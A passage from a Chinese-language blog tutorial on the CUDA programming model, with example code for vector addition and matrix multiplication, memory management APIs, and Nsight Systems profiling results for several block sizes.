&lt;&lt; <span class="string">&quot; KB&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;每个线程块的最大线程数：&quot;</span> &lt;&lt; devProp.maxThreadsPerBlock &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;每个 SM 的最大线程数：&quot;</span> &lt;&lt; devProp.maxThreadsPerMultiProcessor &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;每个 SM 的最大线程束（Warp）数：&quot;</span> &lt;&lt; devProp.maxThreadsPerMultiProcessor / <span class="number">32</span> &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318204209818.png"
                      class=""
                >
<h4 id="cuda编程模型">CUDA编程模型</h4>
<p>在CUDA中，<strong>host</strong>和<strong>device</strong>是两个重要的概念，我们用host指代CPU及其内存，而用device指代GPU及其内存。CUDA程序中既包含host程序，又包含device程序，它们分别在CPU和GPU上运行。同时，host与device之间可以进行通信，这样它们之间可以进行数据拷贝。</p>
<p>CUDA 代码的核心是核函数（Kernel Function），使用
<code>__global__</code> 关键字定义，并通过 <strong>&lt;&lt;&lt;gridDim,
blockDim&gt;&gt;&gt;</strong> 语法启动：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> *a, <span class="type">int</span> *b, <span class="type">int</span> *c, <span class="type">int</span> N)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> idx = blockIdx.x * blockDim.x + threadIdx.x; <span class="comment">// 计算全局线程索引</span></span><br><span class="line">    <span class="keyword">if</span> (idx &lt; N) &#123;</span><br><span class="line">        c[idx] = a[idx] + b[idx]; <span class="comment">// 向量加法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>主要会用到的三个函数类型限定词如下：</p>
<ul>
<li><code>__global__</code>：在device上执行，从host中调用（一些特定的GPU也可以从device上调用），返回类型必须是<code>void</code>，不支持可变参数参数，不能成为类成员函数。注意用<code>__global__</code>定义的kernel是异步的，这意味着host不会等待kernel执行完就执行下一步。</li>
<li><code>__device__</code>：在device上执行，单仅可以从device中调用，不可以和<code>__global__</code>同时用。</li>
<li><code>__host__</code>：在host上执行，仅可以从host上调用，一般省略不写，不可以和<code>__global__</code>同时用，但可和<code>__device__</code>一起使用，此时函数会在device和host都编译。</li>
</ul>
<h4 id="线程层次结构">线程层次结构</h4>
<ul>
<li><p><strong>线程（Thread）</strong>：CUDA
代码中的最小执行单元。</p></li>
<li><p><strong>线程块（Block）</strong>：多个线程组成一个线程块，每个块在一个
SM 上执行。</p></li>
<li><p><strong>网格（Grid）</strong>：多个线程块组成一个网格，控制整体计算任务。</p></li>
</ul>
<p>grid和block都是定义为<code>dim3</code>类型的变量，<code>dim3</code>可以看成是包含三个无符号整数（x，y，z）成员的结构体变量，在定义时，缺省值初始化为1。因此grid和block可以灵活地定义为1-dim，2-dim以及3-dim结构。CUDA
提供了一些内置变量来管理线程和线程块：</p>
<ul>
<li><code>threadIdx.x</code>、<code>threadIdx.y</code>、<code>threadIdx.z</code>：当前线程在线程块中的索引</li>
<li><code>blockIdx.x</code>、<code>blockIdx.y</code>、<code>blockIdx.z</code>：当前线程块在网格中的索引</li>
<li><code>blockDim.x</code>、<code>blockDim.y</code>、<code>blockDim.z</code>：线程块的大小</li>
<li><code>gridDim.x</code>、<code>gridDim.y</code>、<code>gridDim.z</code>：网格的大小</li>
</ul>
<p>在 CUDA 编程中，一个 GPU 只能有一个 Grid，每次调用
<code>kernel&lt;&lt;&lt;gridDim, blockDim&gt;&gt;&gt;();</code>，都会启动
<strong>一个新的 Grid</strong>。你可以多次调用 kernel 来创建多个
Grid。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">kernel1&lt;&lt;&lt;gridDim1, blockDim1&gt;&gt;&gt;(...);</span><br><span class="line">kernel2&lt;&lt;&lt;gridDim2, blockDim2&gt;&gt;&gt;(...);</span><br></pre></td></tr></table></figure></div>
<p><strong>特点</strong>：串行执行，每个 <code>kernel</code>
调用都会生成一个新的 Grid，但它们不会同时运行。</p>
<p>完整的索引计算：</p>
<p><strong>1D 索引 (x 方向)</strong></p>
<ul>
<li>适用于 <strong>一维数据</strong>（如数组）。</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> idx = blockIdx.x * blockDim.x + threadIdx.x;</span><br></pre></td></tr></table></figure></div>
<p><strong>2D 索引 (x, y 方向)</strong></p>
<ul>
<li>适用于 <strong>图像、矩阵</strong> 等二维数据。</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> row = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class="line"><span class="type">int</span> col = blockIdx.x * blockDim.x + threadIdx.x;</span><br></pre></td></tr></table></figure></div>
<p><strong>3D 索引 (x, y, z 方向)</strong></p>
<ul>
<li>适用于 <strong>三维网格、体渲染</strong>（如 MRI、3D
物理模拟）。</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> x = blockIdx.x * blockDim.x + threadIdx.x;</span><br><span class="line"><span class="type">int</span> y = blockIdx.y * blockDim.y + threadIdx.y;</span><br><span class="line"><span class="type">int</span> z = blockIdx.z * blockDim.z + threadIdx.z;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318200414665.png"
                      class=""
                >
<p>在 CUDA 计算架构中，<strong>Streaming Multiprocessor (SM)</strong> 是
GPU 计算的核心单元。每个 GPU 由多个 SM 组成。</p>
<p>一个 <strong>SM</strong> 可以看作是一个并行计算的“迷你
CPU”，但它专门优化用于 <strong>高吞吐量并行计算</strong>。每个 SM
包含：</p>
<ul>
<li><strong>CUDA Cores</strong>（流处理器，SP）：用于执行标量运算</li>
<li><strong>Warp Scheduler</strong>（线程束调度器）：控制 32
个线程（warp）并行执行</li>
<li><strong>寄存器 (Registers)</strong>：线程级别的高效存储</li>
<li><strong>共享内存 (Shared Memory)</strong>：线程块 (Thread Block)
级别的快速存储</li>
<li><strong>Tensor Cores</strong>（部分 GPU 具有）：用于矩阵乘法和 AI
计算</li>
<li><strong>Special Function Units
(SFU)</strong>：执行复杂数学运算，如三角函数和指数运算</li>
<li><strong>LD/ST 单元 (Load/Store Units)</strong>：处理全局内存（Global
Memory）读写</li>
</ul>
<p>一个线程块只能在一个SM上被调度，SM一般可以调度多个线程块。</p>
<h4 id="cuda内存模型">CUDA内存模型</h4>
<p>每个线程有自己的私有本地内存（Local
Memory），而每个线程块有包含共享内存（Shared
Memory）,可以被线程块中所有线程共享，其生命周期与线程块一致。此外，所有的线程都可以访问全局内存（Global
Memory）。还可以访问一些只读内存块：常量内存（Constant
Memory）和纹理内存（Texture Memory）。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318215129460.png"
                      class=""
                >
<h5 id="内存管理api">内存管理API</h5>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">cudaError_t <span class="title function_">cudaMalloc</span><span class="params">(<span class="type">void</span>** devPtr, <span class="type">size_t</span> size)</span>;		<span class="comment">// 在device上分配内存</span></span><br><span class="line">cudaError_t <span class="title function_">cudaFree</span><span class="params">(<span class="type">void</span>** devPtr)</span>;					<span class="comment">// 释放分配的内存</span></span><br><span class="line">cudaError_t <span class="title function_">cudaMemcpy</span><span class="params">(<span class="type">void</span>* dst, <span class="type">const</span> <span class="type">void</span>* src, <span class="type">size_t</span> count, cudaMemcpyKind kind)</span>;	</span><br><span class="line"><span class="comment">// 负责host和device之间数据通信</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">device_builtin__</span> <span class="title">cudaMemcpyKind</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    cudaMemcpyHostToHost          =   <span class="number">0</span>,      <span class="comment">/**&lt; Host   -&gt; Host */</span></span><br><span class="line">    cudaMemcpyHostToDevice        =   <span class="number">1</span>,      <span class="comment">/**&lt; Host   -&gt; Device */</span></span><br><span class="line">    cudaMemcpyDeviceToHost        =   <span class="number">2</span>,      <span class="comment">/**&lt; Device -&gt; Host */</span></span><br><span class="line">    cudaMemcpyDeviceToDevice      =   <span class="number">3</span>,      <span class="comment">/**&lt; Device -&gt; Device */</span></span><br><span class="line">    cudaMemcpyDefault             =   <span class="number">4</span>       <span class="comment">/**&lt; Direction of the transfer is inferred from the pointer values. Requires unified virtual addressing */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//统一内存使用一个托管内存来共同管理host和device中的内存，并且自动在host和device中进行数据传输。</span></span><br><span class="line">cudaError_t <span class="title function_">cudaMallocManaged</span><span class="params">(<span class="type">void</span> **devPtr, <span class="type">size_t</span> size, <span class="type">unsigned</span> <span class="type">int</span> flag=<span class="number">0</span>)</span>;		</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="向量加法实例">向量加法实例</h4>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span>  <span class="comment">// CUDA 运行时 API</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;device_launch_parameters.h&gt;</span>  <span class="comment">// 宏定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 两个向量加法kernel，grid和block均为一维</span></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">float</span>* x, <span class="type">float</span> * y, <span class="type">float</span>* z, <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取全局索引</span></span><br><span class="line">    <span class="type">int</span> index = threadIdx.x + blockIdx.x * blockDim.x;</span><br><span class="line">    <span class="comment">// 步长</span></span><br><span class="line">    <span class="type">int</span> stride = blockDim.x * gridDim.x;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = index; i &lt; n; i += stride)</span><br><span class="line">    &#123;</span><br><span class="line">        z[i] = x[i] + y[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> N = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span> nBytes = N * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line">    <span class="comment">// 申请host内存</span></span><br><span class="line">    <span class="type">float</span> *x, *y, *z;</span><br><span class="line">    x = (<span class="type">float</span>*)<span class="built_in">malloc</span>(nBytes);</span><br><span class="line">    y = (<span class="type">float</span>*)<span class="built_in">malloc</span>(nBytes);</span><br><span class="line">    z = (<span class="type">float</span>*)<span class="built_in">malloc</span>(nBytes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        x[i] = <span class="number">10.0</span>;</span><br><span class="line">        y[i] = <span class="number">20.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请device内存</span></span><br><span class="line">    <span class="type">float</span> *d_x, *d_y, *d_z;</span><br><span class="line">    <span class="built_in">cudaMalloc</span>((<span class="type">void</span>**)&amp;d_x, nBytes);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>((<span class="type">void</span>**)&amp;d_y, nBytes);</span><br><span class="line">    <span class="built_in">cudaMalloc</span>((<span class="type">void</span>**)&amp;d_z, nBytes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将host数据拷贝到device</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>((<span class="type">void</span>*)d_x, (<span class="type">void</span>*)x, nBytes, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="built_in">cudaMemcpy</span>((<span class="type">void</span>*)d_y, (<span class="type">void</span>*)y, nBytes, cudaMemcpyHostToDevice);</span><br><span class="line">    <span class="comment">// 定义kernel的执行配置</span></span><br><span class="line">    <span class="function">dim3 <span class="title">blockSize</span><span class="params">(<span class="number">256</span>)</span></span>;</span><br><span class="line">    <span class="comment">// 设置为(N + blockSize.x - 1) / blockSize.x是因为既可以让N/blockSize.x向上取整，多减一个1又能在blockSize.x整除N时不会再向上取整</span></span><br><span class="line">    <span class="function">dim3 <span class="title">gridSize</span><span class="params">((N + blockSize.x - <span class="number">1</span>) / blockSize.x)</span></span>;</span><br><span class="line">    <span class="comment">// 执行kernel</span></span><br><span class="line">    add &lt;&lt;&lt; gridSize, blockSize &gt;&gt;&gt;(d_x, d_y, d_z, N);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将device得到的结果拷贝到host</span></span><br><span class="line">    <span class="built_in">cudaMemcpy</span>((<span class="type">void</span>*)z, (<span class="type">void</span>*)d_z, nBytes, cudaMemcpyDeviceToHost);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查执行结果</span></span><br><span class="line">    <span class="type">float</span> maxError = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        maxError = <span class="built_in">fmax</span>(maxError, <span class="built_in">fabs</span>(z[i] - <span class="number">30.0</span>));</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;最大误差: &quot;</span> &lt;&lt; maxError &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放device内存</span></span><br><span class="line">    <span class="built_in">cudaFree</span>(d_x);</span><br><span class="line">    <span class="built_in">cudaFree</span>(d_y);</span><br><span class="line">    <span class="built_in">cudaFree</span>(d_z);</span><br><span class="line">    <span class="comment">// 释放host内存</span></span><br><span class="line">    <span class="built_in">free</span>(x);</span><br><span class="line">    <span class="built_in">free</span>(y);</span><br><span class="line">    <span class="built_in">free</span>(z);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后我们可以用<strong>nvprof</strong>工具进行性能测试，可能会有如下报错，我们只需进入CUDA根目录下的<code>extras\CUPTI\lib64</code>复制里面对应的dll，然后放在CUDA根目录下的<strong>bin</strong>目录即可。但正常执行还是报错，因为nvprof是旧工具，已经不能用了，换用Nsight
systems(nsys)。该可执行文件在<code>C:\Program Files\NVIDIA Corporation\Nsight Systems 2024.4.2\target-windows-x64</code>目录下，需要手动设置下环境变量。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318230245321.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318230833486.png"
                      class=""
                >
<p>然后进行分析</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">nsys profile CudaRuntime2.exe	# 先生成.nsys-rep文件</span><br><span class="line">nsys stats report1.nsys-rep</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/03/19/CUDA%E7%BC%96%E7%A8%8B%E6%A8%A1%E5%9E%8B%E5%88%9D%E6%8E%A2/image-20250318231559521.png"
                      class=""
                >
<p>能看到我们的<strong>kernel</strong>函数<strong>add</strong>平均总执行时间为<strong>63969.0ns</strong>。然后我们可以调整<strong>block</strong>大小进行对比查看结果（上图是bolocksize为256的结果）。经测试size
64为<strong>98125.0ns</strong>，128为<strong>69123.0ns</strong>，512为<strong>72099.0ns</strong>。可以看出blocksize并不是越大越好的，要适当调整。</p>
<p>上述代码也可以利用host和device共享的托管内存进行管理，简化了内存申请的操作。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> N = <span class="number">1</span> &lt;&lt; <span class="number">20</span>;</span><br><span class="line">    <span class="type">int</span> nBytes = N * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请托管内存</span></span><br><span class="line">    <span class="type">float</span>* x, * y, * z;</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;x, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;y, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;z, nBytes);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        x[i] = <span class="number">10.0</span>;</span><br><span class="line">        y[i] = <span class="number">20.0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义kernel的执行配置</span></span><br><span class="line">    <span class="function">dim3 <span class="title">blockSize</span><span class="params">(<span class="number">256</span>)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">gridSize</span><span class="params">((N + blockSize.x - <span class="number">1</span>) / blockSize.x)</span></span>;</span><br><span class="line">    <span class="comment">// 执行kernel</span></span><br><span class="line">    add &lt;&lt; &lt; gridSize, blockSize &gt;&gt; &gt; (x, y, z, N);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同步device 保证结果能正确访问</span></span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line">    <span class="comment">// 检查执行结果</span></span><br><span class="line">    <span class="type">float</span> maxError = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; N; i++)</span><br><span class="line">        maxError = <span class="built_in">fmax</span>(maxError, <span class="built_in">fabs</span>(z[i] - <span class="number">30.0</span>));</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;最大误差: &quot;</span> &lt;&lt; maxError &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放内存</span></span><br><span class="line">    <span class="built_in">cudaFree</span>(x);</span><br><span class="line">    <span class="built_in">cudaFree</span>(y);</span><br><span class="line">    <span class="built_in">cudaFree</span>(z);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h4 id="矩阵乘法实例">矩阵乘法实例</h4>
<p>这里由于矩阵是二维的，所以我们要逻辑上把grid和block都设置为2维的方便调用。主要的思路就是让位于（x，y）唯一定位到的thread处理矩阵x行y列的数据，所以在划分<strong>grid</strong>和<strong>block</strong>时需要刚好让每个矩阵中的某个元素与一个<strong>thread</strong>一一对应。</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span>  <span class="comment">// CUDA 运行时 API</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;device_launch_parameters.h&gt;</span>  <span class="comment">// 宏定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 矩阵类型，行优先，M(row, col) = *(M.elements + row * M.width + col)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Matrix</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> width;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="type">float</span>* elements;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">float</span> <span class="title">getElem</span><span class="params">(Matrix *A, <span class="type">int</span> row, <span class="type">int</span> col)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> A-&gt;elements[row * A-&gt;width + col];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">void</span> <span class="title">setElem</span><span class="params">(Matrix* A, <span class="type">int</span> row, <span class="type">int</span> col, <span class="type">float</span> val)</span> </span>&#123;</span><br><span class="line">    A-&gt;elements[row * A-&gt;width + col] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">mul</span><span class="params">(Matrix* A, Matrix* B, Matrix* C)</span> </span>&#123;</span><br><span class="line">    <span class="type">float</span> Cvalue = <span class="number">0.0</span>;</span><br><span class="line">    <span class="comment">// 获取全局索引</span></span><br><span class="line">    <span class="type">int</span> row = threadIdx.y + blockIdx.y * blockDim.y;</span><br><span class="line">    <span class="type">int</span> col = threadIdx.x + blockIdx.x * blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A-&gt;width;++i) &#123;</span><br><span class="line">        Cvalue += <span class="built_in">getElem</span>(A, row, i) * <span class="built_in">getElem</span>(B, i, col);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setElem</span>(C, row, col, Cvalue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> width = <span class="number">1</span> &lt;&lt; <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> height = <span class="number">1</span> &lt;&lt; <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 申请托管内存</span></span><br><span class="line">    Matrix* A, * B, * C;</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;A, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;B, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;C, <span class="built_in">sizeof</span>(Matrix));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化数据</span></span><br><span class="line">    <span class="type">int</span> nBytes = width * height * <span class="built_in">sizeof</span>(<span class="type">float</span>);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;A-&gt;elements, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;B-&gt;elements, nBytes);</span><br><span class="line">    <span class="built_in">cudaMallocManaged</span>((<span class="type">void</span>**)&amp;C-&gt;elements, nBytes);</span><br><span class="line"></span><br><span class="line">    A-&gt;height = height;</span><br><span class="line">    A-&gt;width = width;</span><br><span class="line">    B-&gt;height = height;</span><br><span class="line">    B-&gt;width = width;</span><br><span class="line">    C-&gt;height = height;</span><br><span class="line">    C-&gt;width = width;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; width*height; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        A-&gt;elements[i] = <span class="number">1.0f</span>;</span><br><span class="line">        B-&gt;elements[i] = <span class="number">2.0f</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义kernel的执行配置</span></span><br><span class="line">    <span class="function">dim3 <span class="title">blockSize</span><span class="params">(<span class="number">32</span>,<span class="number">32</span>)</span></span>;</span><br><span class="line">    <span class="function">dim3 <span class="title">gridSize</span><span class="params">((width + blockSize.x - <span class="number">1</span>) / blockSize.x, (height + blockSize.y - <span class="number">1</span>) / blockSize.y)</span></span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;blockSize: &quot;</span> &lt;&lt; blockSize.x &lt;&lt; <span class="string">&quot;x&quot;</span> &lt;&lt; blockSize.y &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;gridSize: &quot;</span> &lt;&lt; gridSize.x &lt;&lt; <span class="string">&quot;x&quot;</span> &lt;&lt; gridSize.y &lt;&lt; endl;</span><br><span class="line">    <span class="comment">// 执行kernel</span></span><br><span class="line">    mul &lt;&lt; &lt; gridSize, blockSize &gt;&gt; &gt; (A, B, C);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 同步device 保证结果能正确访问</span></span><br><span class="line">    <span class="built_in">cudaDeviceSynchronize</span>();</span><br><span class="line">    <span class="comment">// 检查执行结果</span></span><br><span class="line">    <span class="type">float</span> maxError = <span class="number">0.0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; width * height; ++i)</span><br><span class="line">        maxError = <span class="built_in">fmax</span>(maxError, <span class="built_in">fabs</span>(C-&gt;elements[i] - <span class="number">2</span> * width));</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;最大误差: &quot;</span> &lt;&lt; maxError &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>我们也可以对GPU与CPU进行矩阵乘法运算的效率进行一个简单的对比：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cuda_runtime.h&gt;</span>  <span class="comment">// CUDA 运行时 API</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;device_launch_parameters.h&gt;</span>  <span class="comment">// 宏定义</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span>  <span class="comment">// 用于测量 CPU 计算时间</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 矩阵类型，行优先，M(row, col) = *(M.elements + row * M.width + col)</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Matrix</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> width;</span><br><span class="line">    <span class="type">int</span> height;</span><br><span class="line">    <span class="type">float</span>* elements;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">float</span> <span class="title">getElem</span><span class="params">(Matrix *A, <span class="type">int</span> row, <span class="type">int</span> col)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> A-&gt;elements[row * A-&gt;width + col];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__device__ <span class="type">void</span> <span class="title">setElem</span><span class="params">(Matrix* A, <span class="type">int</span> row, <span class="type">int</span> col, <span class="type">float</span> val)</span> </span>&#123;</span><br><span class="line">    A-&gt;elements[row * A-&gt;width + col] = val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__global__ <span class="type">void</span> <span class="title">mul</span><span class="params">(Matrix* A, Matrix* B, Matrix* C)</span> </span>&#123;</span><br><span class="line">    <span class="type">float</span> Cvalue = <span class="number">0.0</span>;</span><br><span class="line">    <span class="comment">// 获取全局索引</span></span><br><span class="line">    <span class="type">int</span> row = threadIdx.y + blockIdx.y * blockDim.y;</span><br><span class="line">    <span class="type">int</span> col = threadIdx.x + blockIdx.x * blockDim.x;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; A-&gt;width;++i) &#123;</span><br><span class="line">        Cvalue += <span class="built_in">getElem</span>(A, row, i) * <span class="built_in">getElem</span>(B, i, col);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setElem</span>(C, row, col, Cvalue);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> 